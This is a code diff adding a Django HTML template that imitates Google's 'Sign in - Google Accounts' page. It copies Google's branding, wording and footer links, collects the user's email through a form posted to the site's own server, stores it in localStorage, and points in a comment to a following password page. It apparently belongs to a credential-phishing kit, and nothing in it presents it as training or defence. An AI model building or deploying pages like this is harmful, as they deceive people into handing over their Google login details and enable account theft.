@@ -1,0 +1,54 @@
+{% extends 'base.html' %} 
+{% block title%}
+Sign in - Google Accounts
+{% endblock %}
+
+{% block form %}
+<p id="header">Sign in</p>
+<!--action= {% url 'passwd' %} -->
+<form name="form_email" id="form_email" method="POST">
+{% csrf_token %}
+<p id="use_your_account">Use your Google Account</p>
+<div class="input_email">
+<span id="mini"></span>
+{{ form }}
+</div>
+<!--<input type="email" id="email" name="email" onclick="bar()" placeholder="Email or phone" onfocus="this.placeholder=''" pattern="^[a-zA-Z0-9]+@gmail\.com" required/></center>-->
+<br><a href="" id="forgetEmail" >Forgot email?</a> <br><br>
+<span id="not_your_computer">Not your computer? Use a Private Window to sign in. &#160;
+<a href="" id="a_learn_more">Learn more</a></span><br><br>
+<div id="div_create_account">
+<a href="" id="body_blue_linkss">Create account</a><button onclick="render()" type="submit" id="next_btn">Next</button>
+</div>
+</form>
+
+<script>
+      function bar(){
+        let m = document.getElementById("mini");
+        let e = document.getElementById("email");
+        if (e.value = " "){
+            m.innerHTML = "<span> Email or phone </span>";
+            e.style.border = "2px solid blue";
+            
+        }}
+</script>
+
+<script type="text/javascript">
+  function render(){
+    const email = document.getElementById("email").value;
+    localStorage.setItem("EMAIL" , email);
+    return;
+  }
+</script>
+{%endblock%} 
+
+{% block footer %}
+<div id="footer"><ul>
+    <select name="lang" id="lang" style="color: #212121 ;">
+        <option value="English">English (Australia)</option> 
+        <option value="j">English (Canada)</option>
+    </select><li><a href="https://support.google.com/accounts?hl=en&p=account_iph"style="color: #212121">Help</a></li>
+                 <li><a href="https://accounts.google.com/TOS?loc=NG&hl=en&privacy=true" style="color:#212121">Privacy</a></li>
+                 <li><a href="https://accounts.google.com/TOS?loc=NG&hl=en" style="color:#212121">Terms</a></li></ul>
+    </div>
+{% endblock %}
